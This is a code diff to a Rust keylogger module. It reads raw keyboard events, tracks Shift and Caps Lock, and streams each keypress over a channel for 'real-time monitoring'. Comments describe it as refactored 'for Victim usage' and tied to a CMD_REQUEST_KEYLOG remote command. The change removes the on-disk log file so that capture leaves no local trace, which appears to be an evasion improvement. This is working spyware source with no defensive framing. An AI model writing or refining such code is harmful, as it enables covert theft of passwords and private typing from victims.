@@ -111,59 +111,45 @@ pub fn run() -> io::Result<()> {
     }
 }
 
-/// Refactored for Victim usage
 pub fn run_with_control(
     control_rx: Receiver<Control>,
-    key_tx:      Sender<String>,
+    key_tx: Sender<String>,
 ) -> io::Result<()> {
     let (mut device, _path) = find_keyboard()?;
+    // FIX: REMOVED all file saving code - no local storage
     
-    // Ensure directory for log file exists
-    let _ = std::fs::create_dir_all("./data");
-    let log_path = "./data/captured_keys.txt";
-
     device.set_nonblocking(true)?;
     let mut modifiers = Modifiers::default();
-
+    
     loop {
         // 1. Check control channel
         match control_rx.try_recv() {
             Ok(Control::Stop) | Err(mpsc::TryRecvError::Disconnected) => break,
             Err(mpsc::TryRecvError::Empty) => {}
         }
-
+        
         // 2. Read events
         match device.fetch_events() {
             Ok(events) => {
                 for ev in events {
                     if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
                         let key = parallels_remap(raw_key);
-
-                        // CRITICAL: Update modifiers for ALL events (press AND release)
-                        // to prevent stuck Shift/Caps keys.
+                        
+                        // Update modifiers for ALL events (press AND release)
                         modifiers.update(key, value);
-
-                        // Only LOG and SEND on actual key presses (value == 1)
+                        
+                        // Only SEND on actual key presses (value == 1)
                         if value == 1 {
                             let key_name = format!("{:?}", key).replace("KEY_", "");
                             let mut output = String::new();
                             
                             if modifiers.shift    { output.push_str("[SHIFT] "); }
-                            if modifiers.capslock { output.push_str("[CAPS] ");  }
+                            if modifiers.capslock { output.push_str("[CAPS] "); }
                             output.push_str(&key_name);
                             output.push(' ');
-
-                            // A. Send to live channel (Real-time monitoring)
-                            let _ = key_tx.send(output.clone());
-
-                            // B. Append to file (For bulk CMD_REQUEST_KEYLOG transfer)
-                            if let Ok(mut file) = std::fs::OpenOptions::new()
-                                .create(true)
-                                .append(true)
-                                .open(log_path) 
-                            {
-                                let _ = writeln!(file, "{}", output);
-                            }
+                            
+                            // ONLY send to live channel (NO FILE WRITING)
+                            let _ = key_tx.send(output);
                         }
                     }
                 }
@@ -174,7 +160,8 @@ pub fn run_with_control(
             Err(e) => return Err(e),
         }
     }
-
+    
+    // FIX: REMOVED println about saving logs
     Ok(())
 }
 
